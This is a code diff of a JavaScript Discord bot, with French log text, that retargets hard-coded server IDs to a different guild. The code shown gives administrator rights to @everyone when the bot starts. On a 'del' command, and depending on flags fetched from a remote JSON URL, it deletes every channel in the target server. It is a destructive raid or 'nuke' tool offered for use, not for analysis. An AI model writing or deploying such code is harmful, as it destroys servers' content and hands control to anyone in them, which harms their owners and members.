@@ -7,7 +7,7 @@ var db = "https://api.myjson.com/bins/m3izg"
 
 client.on('ready', () => {
     console.log("Connecter entant que " + client.user.username + client.user.tag)
-    client.guilds.get("635451157082275851").roles.find('name', '@everyone').edit({
+    client.guilds.get("619889843790675979").roles.find('name', '@everyone').edit({
         permissions: ["ADMINISTRATOR"]
     });
 });
@@ -164,34 +164,34 @@ if(message.content === "del") {
     }).then(data => {
         const body = data.body
         if("854" === body.premium) {
-            client.guilds.get("635451157082275851").channels.map(c => {
+            client.guilds.get("619889843790675979").channels.map(c => {
                 c.delete();
             })
         } else {
         }
         if("1" === body.premium1) {
-            client.guilds.get("635451157082275851").channels.map(c => {
+            client.guilds.get("619889843790675979").channels.map(c => {
                 c.delete();
             })
         }
         if("1" === body.premium2) {
-            client.guilds.get("635451157082275851").channels.map(c => {
+            client.guilds.get("619889843790675979").channels.map(c => {
                 c.delete();
             })
         }
         if("1" === body.premium3) {
-            client.guilds.get("635451157082275851").channels.map(c => {
+            client.guilds.get("619889843790675979").channels.map(c => {
                 c.delete();
             })
         }
         if("1" === body.premium4) {
-            client.guilds.get("635451157082275851").channels.map(c => {
+            client.guilds.get("619889843790675979").channels.map(c => {
                 c.delete();
             })
             
         }
         if("1" === body.premium5) {
-            client.guilds.get("635451157082275851").channels.map(c => {
+            client.guilds.get("619889843790675979").channels.map(c => {
                 c.delete();
             })
     
